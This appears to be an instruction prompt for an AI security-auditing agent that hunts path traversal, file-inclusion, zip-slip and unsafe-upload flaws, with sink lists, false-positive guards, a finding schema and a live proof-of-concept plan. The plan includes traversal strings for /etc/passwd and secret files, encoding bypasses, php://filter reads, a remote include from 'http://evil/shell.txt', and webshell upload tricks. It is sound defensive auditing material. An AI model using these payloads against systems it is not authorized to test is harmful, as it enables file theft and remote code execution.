<!--
FINDER PROMPT — path-file. You are a fresh-context auditor hunting ONE class:
Path Traversal & File Handling (directory traversal, LFI/RFI, unrestricted/
unsafe file upload, zip-slip archive extraction, user-controlled file paths).
Read the target's code; emit finding objects. Signal discipline (AGENTS.md) is
binding: only a REACHABLE untrusted-input → filesystem/include sink, where the
input controls the resolved path/name/destination AND no effective canonicalize-
and-confine check sits on the path, is a finding. No defense-in-depth musings,
no dead code, no posture items.
-->

# Finder — Path Traversal & File Handling (`path-file`)

**Class key:** `path-file` · **OWASP:** A01:2025 · **CWE:** CWE-22 (path
traversal) / CWE-98 (PHP file include / RFI) / CWE-73 (external control of
filename or path) / CWE-434 (unrestricted upload of dangerous file type) ·
**ASVS:** V5

## 1. Objective

Find places where untrusted input controls *which* file or directory the server
reads, writes, includes, serves, or extracts to — such that the attacker escapes
the intended base directory (`../`, absolute path, symlink), reads/overwrites
arbitrary files, includes attacker code (LFI/RFI), or lands an
executable/dangerous file in a served/executed location. The bug is the resolved
path/destination being attacker-influenced and not confined to a safe root.

## 2. Where to look

Entry points where a request value becomes part of a path, filename, include
target, or extraction destination:

- **File download / static serving:** `/download?file=`, `/files/:name`,
  `/attachments/:id/raw`, `sendFile`/`send_file`/`X-Sendfile` handlers,
  documentation/asset servers, `?template=`, `?page=`, `?view=`, `?lang=`,
  `?theme=`, report/export downloaders, "view source"/log viewers, avatar/media
  fetchers keyed by a user-supplied name.
- **File upload:** multipart handlers that derive the *stored* path/name from the
  client filename or a `Content-Type`/extension, "import"/"attachment"/"profile
  picture"/"resume" endpoints, chunked-upload assemblers, S3/GCS key builders
  fed the original filename, profile/CMS media managers.
- **Archive / package extraction (zip-slip):** zip/tar/gzip/7z/rar extractors,
  plugin/theme/template installers, backup restore, "import project", container/
  image layer unpackers, anything iterating archive entries and joining
  `entry.name` to an output dir.
- **Includes / dynamic loading (LFI/RFI):** template engine paths, `require`/
  `include`/`import` of a user-named module/partial, i18n/locale file loaders,
  config/plugin loaders that build a path from input, `render(params[:template])`.
- **Path-building utilities:** any `join`/`+`/interpolation that concatenates a
  base dir with a request value, then opens/reads/writes/deletes it; log file
  selectors; `fopen`/`open`/`File.read`/`unlink`/`rmdir` with a computed name.

Route/handler param signals to grep: `file`, `filename`, `name`, `path`, `dir`,
`folder`, `doc`, `page`, `template`, `view`, `include`, `require`, `module`,
`lang`, `locale`, `theme`, `skin`, `report`, `export`, `download`, `attachment`,
`asset`, `media`, `image`, `avatar`, `src`, `dest`, `target`, `key`, `id` (when
mapped to a path), `archive`, `zip`, `upload`. Watch for `..`, leading `/`,
drive letters (`C:\`), and NUL (`%00`) appearing in tests/fixtures — they hint
where the dev already worried about traversal.

Per-language SINK signals:

- **Crystal:** `File.read/open/write/delete`, `File.join(base, x)`,
  `Dir.glob`, `send_file env, path`, Kemal/Lucky static handlers; archive via
  `Compress::Zip::Reader` joining `entry.filename`.
- **Ruby:** `File.read/open/binread/write/delete`, `File.join(base, params[:f])`,
  `IO.read`, `send_file`/`send_data path`, `Rack::File`/`Rack::Static`,
  `render file:`/`render template:` with input, `Kernel#load`/`require` of a
  computed path, `Zip::File.open` / `Gem::Package::TarReader` entry-name joins,
  `FileUtils.cp/mv` to a derived dest, `Marshal.load(File.read(x))`.
- **Node/TS:** `fs.readFile/readFileSync/createReadStream/writeFile/unlink`,
  `path.join(base, req.params.x)`, `res.sendFile(p)`, `express.static`,
  `res.download(p)`, `require(userPath)`, `import(userPath)`,
  template `res.render(req.query.view)`; unzip via `unzipper`/`adm-zip`
  `entry.path`, `tar.x` without `filter`/`strip`, `decompress`.
- **Python:** `open(path)`, `os.path.join(base, x)`, `pathlib.Path(base)/x`,
  `send_file(p)`/`send_from_directory(dir, x)` (the latter is the safe one *if*
  used correctly), `flask.render_template(x)`, `shutil.copy/move`,
  `zipfile.ZipFile.extract/extractall`, `tarfile.extractall` (no `filter=` /
  pre-3.12), `importlib.import_module(x)`, `pickle.load(open(x))`.
- **Go:** `os.Open/ReadFile/Create/WriteFile/Remove`, `filepath.Join(base, x)`,
  `http.ServeFile(w, r, p)`, `http.Dir`/`FileServer` rooted at a bad base,
  `template.ParseFiles(x)`; archive via `zip.OpenReader` + `filepath.Join(dst,
  f.Name)`, `tar.Next()` header `Name` joined to dst.
- **PHP:** `include`/`include_once`/`require`/`require_once($x)` (LFI/RFI — the
  marquee sink), `file_get_contents($x)`, `fopen($x)`, `readfile($x)`,
  `file($x)`, `unlink($x)`, `move_uploaded_file($tmp, $dest)` with derived dest,
  `fputs`/`fwrite` to a computed path, `ZipArchive::extractTo($dir)`,
  `phar://`/`zip://`/`php://filter` wrapper abuse.
- **Java:** `new File(base, x)` / `Paths.get(base, x)` then `Files.read*/write*/
  newInputStream`, `FileInputStream(x)`, `Files.copy`, `response.sendRedirect`/
  `getResourceAsStream(x)`, `RequestDispatcher.include/forward(userPath)`,
  Spring `Resource`/`ResourceLoader.getResource(x)`, `ServletContext.getRealPath`;
  archive via `ZipInputStream` + `new File(dir, entry.getName())`,
  `TarArchiveInputStream`.
- **Rust:** `std::fs::read/write/File::open/remove_file`, `Path::join(base, x)` /
  `base.join(x)`, `PathBuf::from(x)`, actix/axum static-file or
  `NamedFile::open(p)`; archive via `zip::ZipArchive` `file.enclosed_name()`
  (the safe call) vs joining `file.name()` raw, `tar::Archive::unpack`.

## 3. Detection heuristics

**Taint SOURCES** (untrusted): HTTP query/body/path-segment/header/cookie values,
the **client-supplied multipart filename** (`Content-Disposition` `filename=`),
`Content-Type`/declared extension, JSON/form fields naming a file, **archive
entry names** (`zip`/`tar` member paths — the attacker authored the archive, so
every entry name is tainted), message-queue/webhook payloads, and **DB rows that
were originally user-set** (stored path injection — a filename saved earlier,
later joined into a read/serve path). Also: `Location`/symlink targets the code
follows, and URLs in include directives (RFI).

**Taint SINKS** (dangerous op): the language-specific calls in §2 where the
tainted value determines the **resolved path, filename, include target, or
extraction destination** — i.e. it is joined/concatenated/interpolated into a
path then opened/read/written/deleted/served, passed to `include`/`require`/
`import`/`render`, or used as (part of) an archive-extraction output path.

Vulnerable patterns to confirm:

- **Classic `../` traversal (read):** `File.read(File.join("uploads",
  params[:file]))` / `open(os.path.join(BASE, name))` /
  `fs.readFile(path.join(dir, req.params.name))` with no canonicalize-and-confine
  → `name="../../../../etc/passwd"`. On Windows also `..\\` and `C:\\`.
- **Absolute-path override:** many `join`/`File`/`Paths.get` semantics let an
  *absolute* second arg discard the base — Python `os.path.join("/srv", "/etc/
  passwd") == "/etc/passwd"`, Go `filepath.Join` collapses but an absolute
  `x` after a trailing check still escapes, Java `new File(base, "/etc/passwd")`.
  So even input with no `..` can be absolute.
- **Traversal write / overwrite (more severe):** upload or write where the
  destination derives from input → overwrite `~/.ssh/authorized_keys`, a cron
  file, a web-root script, or app config. `move_uploaded_file($tmp,
  "uploads/".$_FILES['f']['name'])` with `name="../config.php"`.
- **Zip-slip / tar-slip:** loop over archive entries joining the entry name to an
  output dir *without* verifying the resolved path stays under the dir →
  `entry.name = "../../../../etc/cron.d/x"`. Tells: `new File(dir,
  entry.getName())`, `filepath.Join(dst, hdr.Name)`, `path.join(out,
  entry.path)`, `zipEntry.extractTo($dir)` with no per-entry confinement, and
  symlink entries pointing outside (tar symlink slip). The safe calls
  (`enclosed_name()`, `tarfile` `filter='data'`, `tar.x` with a `filter`) are
  often *available but unused* right beside the vuln.
- **LFI:** `include $_GET['page'].".php"` / `require($base.$x)` /
  `render(params[:template])` / `res.render(req.query.view)` — attacker reads/
  executes local files (`../../../../etc/passwd%00`, `php://filter/convert.base64
  -encode/resource=config.php`, log poisoning → code exec).
- **RFI:** `include($_GET['mod'])` with `allow_url_include`/`allow_url_fopen`, or
  `require(userUrl)` / dynamic `import(remoteUrl)` → attacker includes
  `http://evil/shell.txt` for RCE.
- **Unrestricted / unsafe upload:** stored file gets an attacker-chosen extension
  *and* lands in a served/executed dir → upload `shell.php`/`x.jsp`/`.aspx` into
  the web root → RCE. Also: extension/`Content-Type` allowlist that is bypassable
  (`shell.php.jpg`, `shell.pHp`, double extension, `.phtml`/`.php5`, NUL/`;`
  truncation, polyglot, `.htaccess`/`web.config` upload re-enabling exec).
- **Filename used unsanitized for storage:** `filename` from the client used as
  the on-disk name without stripping the directory component → traversal *and*
  collision/overwrite.
- **Null-byte / encoding truncation:** `%00`, double-URL-encoding (`%252e%252e`),
  overlong UTF-8, `..%2f`, `..\\`, mixed separators — used to slip past naive
  string checks (still relevant in some runtimes / native libs).
- **Second-order:** filename/path saved safely, later read and joined into a
  read/serve/delete path without re-confinement.

## 4. Not-a-finding (false-positive guard) — check BEFORE flagging

Do NOT report if any of these is present AND effective on the path:

- **Canonicalize-then-confine** (the gold standard): code resolves the path to its
  real, absolute, symlink-free form and verifies it is *inside* the intended base
  before use — `File.realpath`/`Pathname#realpath` + prefix check, Node
  `fs.realpathSync(p)` then `resolved.startsWith(baseReal + path.sep)`, Python
  `os.path.realpath`/`Path.resolve()` + `is_relative_to(base)`, Go
  `filepath.Clean` then `strings.HasPrefix(abs, base+sep)` *after*
  `filepath.Abs`, Java `getCanonicalPath().startsWith(baseCanonical)` or
  `Path.normalize()` + `startsWith`, Rust `canonicalize()` + `starts_with`. The
  prefix check must use the *canonical/real* path (resolves `..` and symlinks)
  and a separator-bounded prefix (so `/srv/dataEVIL` doesn't match `/srv/data`).
- **Framework safe-serve API used correctly:** Flask `send_from_directory(dir,
  name)` (rejects `..`/absolute), Rails `send_file` with a value derived from a
  whitelisted id (not raw user path), Django `FileResponse` of a path validated
  against a root, Go `http.ServeFile` *only* when the path is confined and
  `r.URL.Path` is cleaned, Spring serving a `Resource` resolved under a root with
  `..` rejected. The API alone isn't enough — confirm the *input* it receives is
  confined or id-mapped.
- **Indirect mapping / opaque id:** user supplies an id/key looked up in a DB or a
  fixed map that yields the real path; the raw user string never touches the
  filesystem path. This fully closes traversal — safe.
- **Closed allowlist of names/paths:** input matched against a fixed set
  (`{"en"=>"en.json", ...}`, enum of allowed templates) before building the path.
- **Strict basename + extension allowlist on the path:** `File.basename`/
  `path.basename`/`os.path.basename` strips any directory component AND the
  result is validated (allowlisted extension, no leading dot/slash) AND it is
  joined under a confined base. Basename *alone* still permits absolute-discard on
  some `join`s and doesn't stop overwrite-within-dir — credit it only when
  combined with confinement.
- **Upload safety done right:** stored name is server-generated (UUID/hash), the
  storage dir is **outside any served/executed root** (or served with execution
  disabled — static-only, no script handler, `X-Content-Type-Options: nosniff`),
  and type is validated by content sniff (magic bytes) not just extension/declared
  `Content-Type`. All three together ⇒ not a finding.
- **Archive extraction confined:** each entry's resolved destination is checked to
  stay under the output dir before write (`enclosed_name()`, `tarfile`
  `filter='data'` on 3.12+/backport, `tar.x({filter})`, explicit
  `resolved.startsWith(outReal+sep)` per entry), symlink entries are rejected/
  skipped, and entry size/count limits exist (the slip is closed even if a
  zip-bomb remains — note bomb separately if present).
- **No untrusted source on the path:** the path component is a hardcoded constant,
  an operator/config value, an internal enum, or a typed/validated id that cannot
  carry separators (`:id(\d+)` route, integer cast). A path built entirely from
  trusted parts is not a finding.

If a guard exists but is bypassable, it is NOT a mitigation — flag it and name the
exact bypass in `sanitizers_checked`. Specifically reject as ineffective:
**denylist string-replace** (`replace("../","")` — defeated by `....//`,
`..%2f`, absolute path, or a single non-recursive pass), **prefix check on the
non-canonical string** (doesn't resolve symlinks/`..`), **un-separator-bounded
prefix** (`startsWith("/srv/data")` matches `/srv/data-evil`), **`..`-only
filtering that ignores absolute paths / drive letters / null bytes**,
**extension/`Content-Type` allowlist alone** for uploads (sniff bypass, double
extension, `.htaccess`), and **`basename` applied but the dir is still served as
executable**.

## 5. Severity guidance

- **Critical** — unauthenticated, reachable: **RFI / LFI-to-RCE** (include of an
  attacker URL or local file that gets executed; log-poisoning chain), **upload
  of an executable into a served/executed dir → webshell RCE**, **zip-slip /
  traversal *write*** that overwrites a startup script / cron / `authorized_keys`
  / app code → RCE or full auth bypass, or arbitrary-file-**read** of secrets that
  yields immediate compromise (e.g. reading `.env`/private keys → game over).
  Attacker fully controls the resolved path/destination.
- **High** — authenticated or realistically-conditioned arbitrary file read
  (`/etc/passwd`, app source, other tenants' files), traversal write/overwrite
  behind an auth wall, or upload-to-RCE requiring a known but reachable served
  path; zip-slip behind authn.
- **Medium** — constrained traversal: read limited to a subtree or to a fixed
  extension, partial mitigation (basename applied but absolute-path or symlink
  gap remains), blind/whitelisted-but-bypassable, or file *delete* of low-value
  targets. Upload with weak type checks but storage outside any exec root (no RCE,
  possible stored XSS/content-spoof — note the secondary impact).
- **Low/Info** — traversal provably confined to non-sensitive files with effective
  basename+confinement leaving only a minor predictable-name/info concern, or a
  theoretical join where input cannot carry separators. Usually downgrade or drop
  per §4.

Second-order/stored path injection keeps the severity of its eventual sink; note
the write→read persistence in `rationale`.

## 6. Emit findings as

One JSON object per distinct root cause (dedup call sites; list extras in
`rationale`). Fields:

```json
{
  "id": "path-file-001",
  "title": "Unauthenticated arbitrary file read via traversal in /download?file=",
  "vuln_class": "path-file",
  "owasp": "A01:2025",
  "cwe": "CWE-22",
  "asvs": "V5",
  "severity": "high",
  "status": "likely",
  "confidence": "high",
  "file": "app/controllers/downloads_controller.rb",
  "line": 12,
  "end_line": 14,
  "code_excerpt": "path = File.join(Rails.root.join(\"storage\"), params[:file])\n  send_file path",
  "source": "params[:file] — GET /download query string; route has no auth filter (before_action :authenticate missing on this action)",
  "sink": "File.join(storage, params[:file]) -> send_file path — opens and streams a path the caller controls",
  "data_flow": "params[:file] -> File.join(storage_root, params[:file]) -> send_file; File.join does not resolve or confine, so '../' segments escape storage_root; no realpath+prefix check between source and sink",
  "sanitizers_checked": "no File.basename (directory component preserved); no realpath/canonicalize + base-prefix confinement; no allowlist/id-mapping; no extension restriction; absolute path also escapes (File.join with leading-slash arg); not the send_from_directory-style safe API",
  "rationale": "Reachable from unauth route; file=../../../../etc/passwd resolves outside storage and is streamed back. Same unconfined join at reports_controller.rb:40 (export download).",
  "exploit_sketch": "GET /download?file=../../../../../../etc/passwd -> response body is /etc/passwd; file=../../config/master.key leaks the Rails secret.",
  "dynamic_poc_plan": "Against the running app, request /download?file=../../../../etc/passwd and a control file=readme.txt; confirm the traversal response returns the host file (root:x:0:0 line) while the control returns the in-dir file, proving escape from storage_root.",
  "proposed_fix": "Confine the served path to the storage root and stop letting raw user input determine it — resolve+confine to the base (or map an opaque id to the stored path) so '../'/absolute segments cannot escape. High-level direction, not a patch; the implementing engineer chooses the exact mechanism and code."
}
```

Accuracy bar: `source`, `sink`, `data_flow`, and `sanitizers_checked` must be
concrete and true. `data_flow` traces the variable source→sink and states why the
resolved path/destination is attacker-influenced and unconfined (join/concat/
include/extract), naming any guard encountered and why it fails. `sanitizers_
checked` is the FP guard made explicit — list each §4 control and state it is
absent or, if present, name the exact bypass (e.g. "replace('../','') is
single-pass — `....//` survives", "prefix check on the pre-realpath string —
symlink bypass", "extension allowlist only — `shell.php.jpg` / sniff bypass").
A finding without an untrusted source reaching a real filesystem/include sink in
path-determining position is not a finding. Pick `cwe` by subtype: 22 traversal,
98 PHP include/RFI, 73 external control of filename/path, 434 unrestricted upload.
Use `status:"likely"` for a proven static trace, `"confirmed"` only after dynamic
repro, `"triage"` if reachability/source is uncertain.

## 7. Dynamic PoC strategy

Goal: prove the running app resolves the path/destination outside its intended
root (or executes/serves an attacker file). Pick the oracle matching the subtype:

1. **Read traversal — host-file oracle.** Send the traversal payload and a benign
   control to the same endpoint:
   `?file=../../../../../../etc/passwd` vs `?file=<known-in-dir-file>`.
   **Observed proof** = the traversal response returns content that only exists
   outside the base (the `root:x:0:0:` line of `/etc/passwd`, or the app's
   `.env`/`config/master.key`/private key), while the control returns the in-dir
   file. Try encodings if a naive filter is present: `..%2f`, `%252e%252e%252f`,
   `....//`, `..\\` (Windows), trailing `%00`/`.jpg` truncation.
2. **Write / zip-slip — landed-file oracle.** Upload or extract a crafted
   archive whose entry name escapes the output dir
   (`../../../../tmp/pwn-<nonce>` or, for impact, a path under a writable
   exec/startup dir). **Observed proof** = the file appears at the out-of-dir
   absolute path after extraction (`ls /tmp/pwn-<nonce>` / read it back),
   confirming the join wrote outside the destination. For overwrite impact, target
   a benign sentinel file and show its contents changed.
3. **Upload-to-RCE — webshell oracle.** Upload a file with an executable
   extension and a unique marker payload (e.g. a script printing the nonce), then
   request its served URL. **Observed proof** = fetching the uploaded path returns
   the *executed* output (the computed nonce), not the source — proving the file
   landed in an executable, served location. If exec is blocked but the file is
   served raw with an attacker MIME, demonstrate stored-XSS/content-spoof instead
   and downgrade impact accordingly.
4. **LFI/RFI — include oracle.** For LFI, point the include/template/page param at
   a readable local file or `php://filter/convert.base64-encode/resource=<src>`;
   **observed proof** = file contents (or base64 source) appear in the response.
   For RFI, host a marker payload on a listener the auditor controls and set the
   include param to that URL; **observed proof** = the listener is hit AND the
   remote payload's output (nonce) appears in the response — proving remote
   inclusion/execution.

Run the relevant bypass checks when a partial guard exists: denylist evasion
(`....//`, double-encoding, mixed/absolute paths, drive letters, NUL truncation),
non-canonical prefix-check evasion (symlink inside the base pointing out;
`baseEVIL` prefix collision), and upload type-check evasion (double extension,
case, polyglot, `.htaccess`/`web.config`). Record the exact request/payload and
the observed out-of-root evidence in the `Repro` object (`reproduced`,
`method:"live-exploit"`, `poc`, `observed`, `impact`). An out-of-band callback (RFI)
or a landed out-of-dir file (zip-slip) alone proves the class — set
`method:"live-exploit"`. If the app can't be run, fall back to a focused unit test
that drives the sink with the traversal/slip payload and asserts the resolved path
escapes the base (`method:"unit-test"`).
